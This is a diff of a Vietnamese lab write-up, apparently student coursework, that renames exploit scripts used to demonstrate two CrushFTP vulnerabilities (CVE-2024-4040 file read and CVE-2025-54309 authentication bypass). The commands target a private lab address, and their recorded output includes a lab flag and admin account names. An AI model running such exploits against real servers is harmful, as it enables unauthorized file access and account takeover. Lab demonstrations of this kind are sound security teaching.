@@ -89,13 +89,13 @@ ping 10.10.10.128 -c 2
      > **Kết quả:** In ra `Vulnerable`.
    - Khai thác đọc file cờ bí mật `/var/tmp/nhom05-cve4040.txt` trên máy chủ nội bộ:
      ```bash
-     python3 /root/exploits/read_file.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
+     python3 /root/exploits/read_file_CVE_2024_4040.py http://10.10.10.128:8080 /var/tmp/nhom05-cve4040.txt
      ```
      > **Kết quả:** Đọc thành công nội dung cờ bí mật: `NHOM05-CVE4040-LAB-ONLY`.
 
 4. **Demo lỗ hổng CVE-2025-54309 (Race Condition Authentication Bypass):**
    ```bash
-   python3 /root/exploits/watchTowr-vs-CrushFTP-CVE-2025-54309.py http://10.10.10.128:8080
+   python3 /root/exploits/attack_CVE_2025_54309.py http://10.10.10.128:8080
    ```
    > **Kết quả:** Vượt qua xác thực và trích xuất thành công danh sách người dùng quản trị (`crushadmin`, `default`, `TempAccount`).
 
